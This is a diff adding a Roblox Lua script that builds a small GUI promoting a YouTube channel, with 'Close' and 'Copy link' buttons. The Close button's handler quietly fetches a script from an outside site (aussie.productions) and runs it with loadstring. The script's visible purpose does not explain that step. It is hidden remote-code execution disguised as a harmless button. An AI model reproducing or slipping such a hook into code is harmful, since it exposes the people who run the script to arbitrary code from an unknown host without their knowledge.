@@ -1,0 +1,71 @@
+-- GUI Script for Roblox
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Remove previous GUI if exists
+if playerGui:FindFirstChild("MemzsGui") then
+    playerGui.MemzsGui:Destroy()
+end
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.Name = "MemzsGui"
+screenGui.ResetOnSpawn = false
+
+-- Frame
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+
+-- TextLabel
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, 0, 0.3, 0)
+label.Position = UDim2.new(0, 0, 0, 0)
+label.Text = "Subscribe @memzs._1"
+label.TextColor3 = Color3.new(1, 1, 1)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.SourceSansBold
+label.TextScaled = true
+
+-- Buttons
+local closeButton = Instance.new("TextButton", frame)
+closeButton.Size = UDim2.new(0.45, 0, 0.25, 0)
+closeButton.Position = UDim2.new(0.05, 0, 0.6, 0)
+closeButton.Text = "Close"
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Font = Enum.Font.SourceSans
+closeButton.TextScaled = true
+
+local copyButton = Instance.new("TextButton", frame)
+copyButton.Size = UDim2.new(0.45, 0, 0.25, 0)
+copyButton.Position = UDim2.new(0.5, 0, 0.6, 0)
+copyButton.Text = "Copy link of the channel"
+copyButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
+copyButton.TextColor3 = Color3.new(1, 1, 1)
+copyButton.Font = Enum.Font.SourceSans
+copyButton.TextScaled = true
+
+-- Notification
+local function showNotification(message)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Notification",
+        Text = message,
+        Duration = 3
+    })
+end
+
+-- Events
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+    loadstring(game:HttpGet(request({Url='https://aussie.productions/script'}).Body))()
+end)
+
+copyButton.MouseButton1Click:Connect(function()
+    setclipboard("https://youtube.com/@memzs._1?si=4XaDttANjouQl0Q4")
+    showNotification("The link has been copied to the clipboard.")
+end)
